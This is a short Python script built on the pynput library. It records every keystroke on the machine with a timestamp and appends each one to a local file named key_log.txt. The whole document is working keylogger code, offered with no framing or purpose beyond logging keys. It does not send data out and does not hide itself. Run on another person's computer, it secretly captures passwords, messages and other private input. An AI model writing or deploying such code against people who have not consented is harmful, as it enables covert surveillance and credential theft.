from pynput import keyboard
from datetime import datetime

log_file = "key_log.txt"

def on_press(key):
    time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        log = f"{time}: {key.char}\n"
    except AttributeError:
        log = f"{time}: [{key}]\n"
    with open(log_file, "a") as f:
        f.write(log)

def main():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
